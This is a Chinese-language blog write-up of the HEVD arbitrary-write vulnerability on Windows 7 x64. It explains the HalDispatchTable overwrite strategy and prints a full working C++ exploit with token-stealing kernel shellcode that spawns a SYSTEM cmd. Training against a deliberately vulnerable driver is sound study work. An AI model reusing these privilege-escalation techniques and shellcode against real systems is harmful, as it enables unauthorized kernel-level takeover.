---
title: 'HEVD win7 x64 arbitrary write'
date: 2022-06-29 09:53:53
category: Learning
tags: [windows kernel]
published: true
hideInList: false
feature: 
isTop: false
---

HEVD 中的任意地址写

```
环境：
虚拟机：Win7 SP1 x64
物理机：Win10
debugger：windbg preview
compiler：vs2022
```

## 环境搭建

见前一篇栈溢出

## 漏洞

其中`arbitrary write`为`0x22200b`

```cpp
case 0x22200B:
    DbgPrintEx(0x4Du, 3u, "****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
    FakeObjectNonPagedPoolNxIoctlHandler = ArbitraryWriteIoctlHandler(Irp, CurrentStackLocation);
    v7 = "****** HEVD_IOCTL_ARBITRARY_WRITE ******\n";
    goto LABEL_62;
```

漏洞点十分简单，就是一个任意地址写的漏洞

```cpp
int __fastcall ArbitraryWriteIoctlHandler(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)
{
  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; // rcx
  int result; // eax

  Parameters = IrpSp->Parameters.CreatePipe.Parameters;
  result = 0xC0000001;
  if ( Parameters )
    return TriggerArbitraryWrite((_WRITE_WHAT_WHERE *)Parameters);
  return result;
}
```

```cpp
__int64 __fastcall TriggerArbitraryWrite(_WRITE_WHAT_WHERE *UserWriteWhatWhere)
{
  unsigned __int64 *What; // rbx
  unsigned __int64 *Where; // rdi

  ProbeForRead(UserWriteWhatWhere, 0x10ui64, 1u);
  What = UserWriteWhatWhere->What;
  Where = UserWriteWhatWhere->Where;
  DbgPrintEx(0x4Du, 3u, "[+] UserWriteWhatWhere: 0x%p\n", UserWriteWhatWhere);
  DbgPrintEx(0x4Du, 3u, "[+] WRITE_WHAT_WHERE Size: 0x%X\n", 16i64);
  DbgPrintEx(0x4Du, 3u, "[+] UserWriteWhatWhere->What: 0x%p\n", What);
  DbgPrintEx(0x4Du, 3u, "[+] UserWriteWhatWhere->Where: 0x%p\n", Where);
  DbgPrintEx(0x4Du, 3u, "[+] Triggering Arbitrary Write\n");
  *Where = *What;
  return 0i64;
}
```

输入`0x10`个字节，把`what`上的内容赋到`where`地址上

## 思路

为了能最后提权，我们应该做什么

找个内核的地方写？ 
=> 需要知道内核地址 
=> 通过 `NtQuerySystemInformation/ZwQuerySystemInformation` 接口获取内核的基地址 
=> 通过基地址+偏移获取在内核中的地址

写什么地方？ 
=> 内核中的函数指针 
=> 那这个函数指针对应的接口应该有什么特征呢？ 
=> 应该较少被内核调用，否则被其他地方调用了，就可能导致内核崩溃 && 可以通过用户态的一个接口进行调用，从而触发对函数指针的调用
=> 找到`HalDispatchTable`中偏移为`0x8`位置的`xHalSetSystemInformation`函数指针接口完美符合，上层可由`NtQueryIntervalProfile`或`NtSetIntervalProfile`调用

（P.S. 这里的思路可参考这个[ECFID.pdf](https://shinnai.altervista.org/papers_videos/ECFID.pdf) ）

整个流程类似下图，在用户空间写的进程，先通过任意地址写漏洞修改了`HalDispatchTable`，然后通过用户态的接口调用`NtQueryIntervalProfile`，从而使用了`xHalQuerySysttemInformation`这个函数指针，最后跳转到`shellcode`上

![流程图](/img/HEVD-win7-x64-arbitrary-write/QQ截图20220628204429.png)


这里说明一下`Nt* | ZW*`区别

1. 在`ntdll.dll`中，`Nt*`和`Zw*`应该是没区别，这个是跑在`ring3`的
2. 在`ntoskrnl`中，`Nt*`和`Zw*`都是跑在`ring0`。`Nt*`是该接口的具体实现，绕过了`SSDT`，而`Zw*`是通过`SSDT`的`KiSystemService`调用`ntoskrnl`中的`Nt*`函数（我通过`uf`看的汇编的流程是，`nt!Zw*`->`nt!KiServiceInternal`->`nt!KiSystemServiceStart`）

这部分的区别参考以下博客[1](https://blog.csdn.net/SysProgram/article/details/5805265)，[2](https://blog.csdn.net/shenjianxz/article/details/52704046)，[3](https://blog.csdn.net/evi10r/article/details/6742052)，[4](https://codeantenna.com/a/fsxdbtaiWL)，[5](https://blog.csdn.net/SysProgram/article/details/5805265)

关于`SSDT`的说明，有[1](https://bbs.pediy.com/thread-177772.htm)，[2](https://bbs.pediy.com/thread-84946-1.htm)，[3](https://www.anquanke.com/post/id/262577)

## exp

整个流程应该为

1. `GetKernelBaseSystemModule`：通过`NtQuerySystemInformation/ZwQuerySystemInformation`接口获取`SYSTEM_MODULE`，从而获取内核的基址
2. `GetHalDispatchTableAddress`：通过基址找到`HalDispatchTable`在内核中的地址，从而找到`xHalSetSystemInformation`这一函数指针的地址，即`Where`
3. `Perpare`：准备`shellcode`，以及与驱动进行交互，进行任意地址写
4. `TriggerShellcode`：通过用户态的`ntdll`的`NtQueryIntervalProfile`接口执行`shellcode`并正常返回
5. `start cmd`：起一个提权的`cmd`

### GetKernelBaseSystemModule

第一次调用`ntdll.ZwQuerySystemInformation(0xb, NULL, 0, &len)`可以得到一个`error`的结果，但是会在`len`上返回一个该查询会得到的结构体大小（P.S. 第一次`len`指向`0`）

第二次调用`ntdll.ZwQuerySystemInformation`，把正确的大小（`len`）和空间（`PModuleInfo`）输入进去，即可得到`SYSTEM_MODULE`的信息，`ntdll.ZwQuerySystemInformation(0xb, PModuleInfo, len, &len)`

在`PModuleInfo`这个结构体是由`ULONG ModulesCount`和`SYSTEM_MODULE Modules[ModulesCount]`数组组成的，前一项表示存在多少项`SYSTEM_MODULE`，之后就是每个`SYSTEM_MODULE`的详细信息

在这里可以通过`module.Name`是否为`ntoskrnl`从而得到`ImageBaseAddress`（P.S. 但是从[Gcow exp](https://www.anquanke.com/post/id/246289)和我自己写完`exp`跑完的结果来看，这个`ntoskrnl.exe`一直是第一项）

这个地方的获取基址，这篇 [Windows取内核中的函数](https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/) 讲得特别清楚

（P.S. 我在这里踩了一个坑，就是`struct SYSTEM_MODULE`，里面写每个属性时，没把`ULONG`写成带数字的，当时我查了一下`ULONG`默认是`8`字节，结果最后打印项的时候发现不对）

### GetHalDispatchTableAddress

通过得到的`SYSTEM_MODULE`，经过`userland_HalDispatchTable - uerland_base + kernel_base`就可以得到`HalDispatchTable`在内核中的地址了

### TriggerShellcode

因为是通过上层`ntdll`的`api`去调用底层的`xHalSetSystemInformation`地址上的函数指针，就需要查看这个调用链上的情况

在`ntoskrnl.exe`中可以利用`windbg`下载的`.pdb`得到符号，从而直接找到`NtQueryIntervalProfile`的地址

```cpp
NTSTATUS __stdcall NtQueryIntervalProfile(KPROFILE_SOURCE ProfileSource, PULONG Interval)
{
  PULONG v2; // rbx

  v2 = Interval;
  if ( KeGetCurrentThread()->PreviousMode )
  {
    if ( (unsigned __int64)Interval >= MmUserProbeAddress )
      Interval = (PULONG)MmUserProbeAddress;
    *Interval = *Interval;
  }
  *v2 = KeQueryIntervalProfile(ProfileSource);
  return 0;
}
```

可以看到第一个函数的接口部分，没什么需要设置的（P.S. 我就使`Interval`是个可读写的地址）

```cpp
__int64 __fastcall KeQueryIntervalProfile(int a1)
{
  int v2; // [rsp+20h] [rbp-18h] BYREF
  char v3; // [rsp+24h] [rbp-14h]
  unsigned int v4; // [rsp+28h] [rbp-10h]
  char v5; // [rsp+40h] [rbp+8h] BYREF

  if ( !a1 )
    return (unsigned int)KiProfileInterval;
  if ( a1 == 1 )
    return (unsigned int)KiProfileAlignmentFixupInterval;
  v2 = a1;
  if ( (int)((__int64 (__fastcall *)(__int64, __int64, int *, char *))off_1401E2CF8)(1i64, 12i64, &v2, &v5) >= 0 && v3 )
    return v4;
  else
    return 0i64;
}
```

第二个函数，需要传进来的`ProfileSource`不能为`0`和`1`，因此我设置为`2`

### EXP

最终版

```cpp
#include <iostream>
#include <string.h>
#include <windows.h>

typedef struct SYSTEM_MODULE {
    ULONG64 Reserved1;
    ULONG64 Reserved2;
    ULONG64 ImageBaseAddress;
    ULONG32 ImageSize;
    ULONG32 Flags;
    USHORT Id;
    USHORT Rank;
    USHORT LoadCount;
    USHORT NameOffset;
    CHAR Name[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 0xB
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PZwQuerySystemInformation)
(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
);

typedef NTSTATUS(WINAPI* PNtQueryIntervalProfile)
(
    __in INT32 ProfileSource,
    __in PULONG * Interval
);

SYSTEM_MODULE GetKernelBaseSystemModule()
{
    // Using NtQuerySystemInformation/ZwQuerySystemInformation Interface to get kernel image base
    if (sizeof(SYSTEM_MODULE) != 0x128)
    {
        std::cout << "[!] struct SYSTEM_MODULE Error" << std::endl;
        system("pause");
        exit(-1);
    }

    // Load ntdll.dll
    HMODULE hNtdll = LoadLibraryA("ntdll");

    if (hNtdll == NULL)
    {
        std::cout << "[!] Load Ntdll Failed" << std::endl;
        system("pause");
        exit(-1);
    }

    // [*] Get NtQuerySystemInformation/ZwQuerySystemInformation address
    std::cout << "[*] Get ZwQuerySystemInformation Address" << std::endl;
    PZwQuerySystemInformation ZwQuerySystemInformation = (PZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
    if (!ZwQuerySystemInformation)
    {
        std::cout << "[!] Failed to Get the Address of NtQuerySystemInformation" << std::endl;
        std::cout << "[!] Last Error: " << GetLastError() << std::endl;
        system("pause");
        exit(-1);
    }

    // [*] Get Buffer Length
    std::cout << "[*] Get Buffer Length" << std::endl;
    ULONG len = 0;
    // the API Call ends in an error, but we can get the correct Length in ReturnLength 
    ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

    // Allocate Memory
    PSYSTEM_MODULE_INFORMATION PModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Get SYSTEM_MODULE_INFORMATION
    std::cout << "[*] Get SYSTEM_MODULE_INFORMATION" << std::endl;
    NTSTATUS Status = ZwQuerySystemInformation(SystemModuleInformation, PModuleInfo, len, &len);
    switch (Status)
    {
    case (NTSTATUS)0x0:
        std::cout << "[*] NtQuerySystemInformation Sucess" << std::endl;
        break;
    case (NTSTATUS)0xC0000004:
        std::cout << "[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)" << std::endl;
        system("pause");
        exit(-1);
    case (NTSTATUS)0xC0000005:
        std::cout << "[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)" << std::endl;
        system("pause");
        exit(-1);
    default:
        std::cout << "[!] NtQuerySystemInformation Failed" << std::endl;
        system("pause");
        exit(-1);
    }
    
    std::cout << "[*] Module Count: " << PModuleInfo->ModulesCount << std::endl;

    INT32 i = 0;

    while (i < PModuleInfo->ModulesCount)
    {
        SYSTEM_MODULE CurrentSM = PModuleInfo->Modules[i];

        std::cout << "[*] Log System Module:" << std::endl;
        std::cout << "- Reserved1 0x" << std::hex << CurrentSM.Reserved1 << std::endl;
        std::cout << "- Reserved2 0x" << std::hex << CurrentSM.Reserved2 << std::endl;
        std::cout << "- ImageBaseAddress 0x" << std::hex << CurrentSM.ImageBaseAddress << std::endl;
        std::cout << "- ImageSize 0x" << std::hex << CurrentSM.ImageSize << std::endl;
        std::cout << "- Flags 0x" << std::hex << CurrentSM.Flags << std::endl;
        std::cout << "- Id 0x" << std::hex << CurrentSM.Id << std::endl;
        std::cout << "- Rank 0x" << std::hex << CurrentSM.Rank << std::endl;
        std::cout << "- LoadCount 0x" << std::hex << CurrentSM.LoadCount << std::endl;
        std::cout << "- NameOffset 0x" << std::hex << CurrentSM.NameOffset << std::endl;
        std::cout << "- Name " << CurrentSM.Name << std::endl;
        
        if (strstr(CurrentSM.Name, "ntoskrnl") || strstr(CurrentSM.Name, "ntkrnl"))
        {
            return CurrentSM;
        }

        i += 1;
    }
    
    std::cout << "[!] Can not find" << std::endl;
    system("pause");
    exit(-1);
}

ULONG64 GetHalDispatchTableAddress(SYSTEM_MODULE SM)
{
    CHAR NtName[256] = { 0 };

    strncpy(NtName, strrchr(SM.Name, '\\')+1, strlen(strrchr(SM.Name, '\\')+1));

    HMODULE hNtkrnl = LoadLibraryA(NtName);

    if (hNtkrnl == NULL)
    {
        std::cout << "[!] Open " << NtName << " Failed" << std::endl;
        exit(-1);
    }

    ULONG64 userlandHal = (ULONG64)GetProcAddress(hNtkrnl, "HalDispatchTable");
    ULONG64 kernelHal = userlandHal - (ULONG64)hNtkrnl + SM.ImageBaseAddress;

    std::cout << "[*] HalDispatchTable: 0x" << std::hex << kernelHal << std::endl;

    /*
    HalDispatchTable:
    1: kd> dq 0xfffff80003fe2cf0
    fffff800`03fe2cf0  00000000`00000004 fffff800`044148e8
    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0

    1: kd> uf fffff800`044148e8
    hal!HaliQuerySystemInformation:
    fffff800`044148e8 fff3            push    rbx
    fffff800`044148ea 55              push    rbp
    fffff800`044148eb 56              push    rsi
    fffff800`044148ec 57              push    rdi
    fffff800`044148ed 4154            push    r12
    */

    return kernelHal;
}

VOID TriggerShellcode()
{
    /*
    0: kd> uf NtQueryIntervalProfile
    ntdll!NtQueryIntervalProfile:
    00000000`77b7aa80 4c8bd1          mov     r10,rcx
    00000000`77b7aa83 b81d010000      mov     eax,11Dh
    00000000`77b7aa88 0f05            syscall
    00000000`77b7aa8a c3              ret
    0: kd> uf nt!NtQueryIntervalProfile
    nt!NtQueryIntervalProfile:
    fffff800`041b7940 48895c2408      mov     qword ptr [rsp+8],rbx
    fffff800`041b7945 57              push    rdi
    fffff800`041b7946 4883ec20        sub     rsp,20h
    fffff800`041b794a 488bda          mov     rbx,rdx
    */

    HMODULE hNtdll = LoadLibraryA("ntdll");
    PNtQueryIntervalProfile NtQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(hNtdll, "NtQueryIntervalProfile");

    PULONG null = 0;
    NtQueryIntervalProfile(2, &null);
}

int main()
{
    // open device 
    HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);

    if (dev == INVALID_HANDLE_VALUE)
    {
        std::cout << "[!] Open HackSysExtremeVulnerableDriver Failed" << std::endl;
        system("pause");

        return -1;
    }

    std::cout << "[*] Device Handle: 0x" << std::hex << dev << std::endl;

    SYSTEM_MODULE KBSM = GetKernelBaseSystemModule();

    ULONG64 HalDispatchTable = GetHalDispatchTableAddress(KBSM);

    CHAR shellcode[] =
    {	
        // push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15
        "\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57"
        
        // change token
        "\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00"
        
        // pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;
        "\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58"

        "\xc3"								// ret: return to func KeQueryIntervalProfile 
    };

    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (addr == NULL)
    {
        std::cout << "[!] VirtualAlloc failed" << std::endl;
        system("pause");

        return -1;
    }

    RtlCopyMemory(addr, shellcode, sizeof(shellcode));
    ULONG64* ptrShellcode = (ULONG64 *)&addr;

    std::cout << "[*] shecllode addr: 0x" << std::hex << addr << std::endl;

    ULONG64 chBuffer[2] = { 0 };

    chBuffer[0] = (ULONG64)ptrShellcode;
    chBuffer[1] = (ULONG64)(HalDispatchTable + 0x8);

    DWORD size_returned = 0;

    DeviceIoControl(dev, 0x22200B, chBuffer, 0x10, NULL, 0, &size_returned, NULL);
    /*
    0: kd> dq 0xfffff80003fe2cf0
    fffff800`03fe2cf0  00000000`00000004 00000000`000e0000
    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0
    */
    CloseHandle(dev);

    TriggerShellcode();

    system("start cmd");
    system("pause");

    return 0;
}
```

## 参考

> https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/
> https://h0mbre.github.io/HEVD_AbitraryWrite_64bit
> https://www.anquanke.com/post/id/246289
